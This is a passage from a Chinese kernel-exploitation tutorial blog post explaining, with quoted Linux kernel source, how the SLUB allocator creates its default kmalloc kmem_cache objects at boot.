                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/80fbfc5452e6ee425f7676a492aef25a.png"
                      alt="在这里插入图片描述"
                ></p>
<h5 id="kmem-cache-创建"><a href="#kmem-cache-创建" class="headerlink" title="kmem_cache 创建"></a>kmem_cache 创建</h5><p>slub 分配器把伙伴系统提供的内存内存切割成特定大小的块，进行内核的小内存分配。</p>
<p>具体来说，内核会预先定义一些 <code>kmem_cache</code> 结构体，它保存着要如何分割使用内存页的信息，可以通过 <code>cat /proc/slabinfo</code> 查看系统当前可用的 <code>kmem_cache</code> 。</p>
<p>内核很多的结构体会频繁的申请和释放内存，用 <code>kmem_cache</code> 来管理特定的结构体所需要申请的内存效率上就会比较高，也比较节省内存。默认会创建 <code>kmalloc-8k</code> ，<code>kmalloc-4k</code>，… ，<code>kmalloc-16</code> ，<code>kmalloc-8</code> 这样的 cache ，<code>kmem_cache</code> 的名称以及大小使用 <code>struct kmalloc_info_struct</code> 管理。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                      <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样内核调用 <code>kmalloc</code> 函数时就可以根据申请的内存大小找到对应的 <code>kmalloc-xx</code> ，然后在里面找可可用的内存块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>

<p>创建默认的 <code>kmem_cache</code> 过程存在如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x86_64_start_kernel()</span><br><span class="line">    x86_64_start_reservations()</span><br><span class="line">        start_kernel()</span><br><span class="line">            mm_init()</span><br><span class="line">                kmem_cache_init()</span><br><span class="line">                    create_kmalloc_caches()</span><br><span class="line">                        new_kmalloc_cache()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>new_kmalloc_cache</code> 中根据 <code>kmalloc_info</code> 的信息创建对应的 <code>kmalloc_cache</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init</span><br><span class="line"><span class="title function_">new_kmalloc_cache</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> type, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == KMALLOC_RECLAIM) &#123;</span><br><span class="line">		flags |= SLAB_RECLAIM_ACCOUNT;</span><br><span class="line">		name = kmalloc_cache_name(<span class="string">&quot;kmalloc-rcl&quot;</span>,</span><br><span class="line">						kmalloc_info[idx].size);</span><br><span class="line">		BUG_ON(!name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		name = kmalloc_info[idx].name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kmalloc_caches[type][idx] = create_kmalloc_cache(name,</span><br><span class="line">					kmalloc_info[idx].size, flags, <span class="number">0</span>,</span><br><span class="line">					kmalloc_info[idx].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看到默认创建的 <code>kmem_cache</code> 的地址被保存在 <code>kmalloc_caches</code> 因此可以通过该结构获得 <code>kmem_cache</code> 的地址，从而获取到重要调试信息，比如 <code>freelist</code> 在 <code>object</code> 中的偏移 <code>offset</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/image-20241115134915853.png"
                      alt="image-20241115134915853"
                ></p>
<p><code>create_kmalloc_cache</code> 函数调用了核心函数 <code>create_boot_cache</code> ，之后 <code>list_add</code> 将创建的 <code>kmem_cache</code> 加入到 <code>slab_caches</code> 链表中。内核全局有一个 <code>slab_caches</code> 变量，它是一个链表，系统所有的 <code>kmem_cache</code> 都接在这个链表上。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *__init <span class="title function_">create_kmalloc_cache</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> kmem_cache_zalloc(kmem_cache, GFP_NOWAIT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		panic(<span class="string">&quot;Out of memory when creating slab %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">	create_boot_cache(s, name, size, flags, useroffset, usersize);</span><br><span class="line">	list_add(&amp;s-&gt;<span class="built_in">list</span>, &amp;slab_caches);</span><br><span class="line">	memcg_link_cache(s);</span><br><span class="line">	s-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>create_boot_cache</code> 初始化了相关信息，之后调用 <code>__kmem_cache_create</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">create_boot_cache</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	s-&gt;name = name;</span><br><span class="line">	s-&gt;size = s-&gt;object_size = size;</span><br><span class="line">	s-&gt;align = calculate_alignment(flags, ARCH_KMALLOC_MINALIGN, size);</span><br><span class="line">	s-&gt;useroffset = useroffset;</span><br><span class="line">	s-&gt;usersize = usersize;</span><br><span class="line"></span><br><span class="line">	slab_init_memcg_params(s);</span><br><span class="line"></span><br><span class="line">	err = __kmem_cache_create(s, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		panic(<span class="string">&quot;Creation of kmalloc slab %s size=%u failed. Reason %d\n&quot;</span>,</span><br><span class="line">					name, size, err);</span><br><span class="line"></span><br><span class="line">	s-&gt;refcount = <span class="number">-1</span>;	<span class="comment">/* Exempt from merging for now */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>__kmem_cache_create</code> 调用了 <code>kmem_cache_open</code> 函数，该函数做了很多重要的初始化操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * calculate_sizes() determines the order and the distribution of data within</span></span><br><span class="line"><span class="comment"> * a slab object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">calculate_sizes</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> forced_order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Round up object size to the next word boundary. We can only</span></span><br><span class="line"><span class="comment">	 * place the free pointer at word boundaries and this determines</span></span><br><span class="line"><span class="comment">	 * the possible location of the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine if we can poison the object itself. If the user of</span></span><br><span class="line"><span class="comment">	 * the slab may touch the object after free or before allocation</span></span><br><span class="line"><span class="comment">	 * then we should never poison the object itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_POISON) &amp;&amp; !(flags &amp; SLAB_TYPESAFE_BY_RCU) &amp;&amp;</span><br><span class="line">			!s-&gt;ctor)</span><br><span class="line">		s-&gt;flags |= __OBJECT_POISON;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		s-&gt;flags &amp;= ~__OBJECT_POISON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are Redzoning then check if there is some space between the</span></span><br><span class="line"><span class="comment">	 * end of the object and the free pointer. If not then add an</span></span><br><span class="line"><span class="comment">	 * additional word to have some bytes to store Redzone information.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_RED_ZONE) &amp;&amp; size == s-&gt;object_size)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * With that we have determined the number of bytes in actual use</span></span><br><span class="line"><span class="comment">	 * by the object. This is the potential offset to the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;inuse = size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((flags &amp; (SLAB_TYPESAFE_BY_RCU | SLAB_POISON)) ||</span><br><span class="line">		s-&gt;ctor)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Relocate free pointer after the object if it is not</span></span><br><span class="line"><span class="comment">		 * permitted to overwrite the first word of the object on</span></span><br><span class="line"><span class="comment">		 * kmem_cache_free.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is the case if we do RCU, have a constructor or</span></span><br><span class="line"><span class="comment">		 * destructor or are poisoning the objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;offset = size;</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_STORE_USER)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Need to store information about allocs and frees after</span></span><br><span class="line"><span class="comment">		 * the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> track);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	kasan_cache_create(s, &amp;size, &amp;s-&gt;flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Add some empty padding so that we can catch</span></span><br><span class="line"><span class="comment">		 * overwrites from earlier objects rather than let</span></span><br><span class="line"><span class="comment">		 * tracking information or the free pointer be</span></span><br><span class="line"><span class="comment">		 * corrupted if a user writes before the start</span></span><br><span class="line"><span class="comment">		 * of the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">		s-&gt;red_left_pad = <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">		s-&gt;red_left_pad = ALIGN(s-&gt;red_left_pad, s-&gt;align);</span><br><span class="line">		size += s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SLUB stores one object immediately after another beginning from</span></span><br><span class="line"><span class="comment">	 * offset 0. In order to align the objects we have to simply size</span></span><br><span class="line"><span class="comment">	 * each object to conform to the alignment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, s-&gt;align);</span><br><span class="line">	s-&gt;size = size;</span><br><span class="line">	<span class="keyword">if</span> (forced_order &gt;= <span class="number">0</span>)</span><br><span class="line">		order = forced_order;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line">	<span class="keyword">if</span> (oo_objects(s-&gt;oo) &gt; oo_objects(s-&gt;max))</span><br><span class="line">		s-&gt;max = s-&gt;oo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = 